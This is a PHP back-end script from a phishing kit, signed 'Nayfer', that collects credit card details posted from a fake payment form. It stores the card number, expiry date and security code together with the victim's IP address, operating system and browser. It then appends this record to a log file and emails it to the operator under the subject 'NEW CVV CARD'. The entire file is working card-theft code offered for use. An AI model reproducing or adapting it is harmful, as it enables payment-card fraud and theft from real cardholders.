<?php
/*
 ▄████▄   ██▀███   ▄▄▄      ▒██   ██▒      ██▓███   ██▀███   ▒█████  
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒▒ █ █ ▒░     ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░░  █   ░     ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██  ░ █ █ ▒      ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ▒██▒ ██▓ ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░ ▒▓▒ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░ ░▒  ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ 
░          ░░   ░   ░   ▒    ░    ░   ░   ░░         ░░   ░ ░ ░ ░ ▒  
░ ░         ░           ░  ░ ░    ░    ░              ░         ░ ░  
░                                      ░                             
$$Nayfer
*/
session_start();
include("system.php"); 
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$cardnumber = $_SESSION['cardnumber'] = $_POST['addCreditCardNumber'];
$expdate = $_SESSION['expdate'] = $_POST['expirationdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['txtSecurityCode'];

$emailtext ='<!DOCTYPE html>
<html lang="en">
<head>
</div><br> The Card Number </div><br>

</div><br> Card Number = '.$_SESSION["cardnumber"].' </div><br>
</div><br> MM/YY  = '.$_SESSION["expdate"].' </div><br>
</div><br> CCV =  '.$_SESSION["Securitycode"].' </div><br>
***************
</div><br> System    =  '.$OS.' </div><br>
</div><br> Browser   = '.$browserTy_Version.' </div><br>
</div><br> Ip Address = '.$_SERVER["REMOTE_ADDR"].' </div><br>
</div><br> Date Time = '.$InfoDATE.' </div><br>
';



include("sand_email.php"); 
include("function.php"); 


$f = fopen("../../azert14.php", "a");
	fwrite($f, $emailtext);


$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "NEW CVV CARD Wu [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: Nayfer" . "\r\n";
mail($yourmail, $subject, $emailtext, $headers);
mail($yourmail2, $subject, $emailtext, $headers);




?>


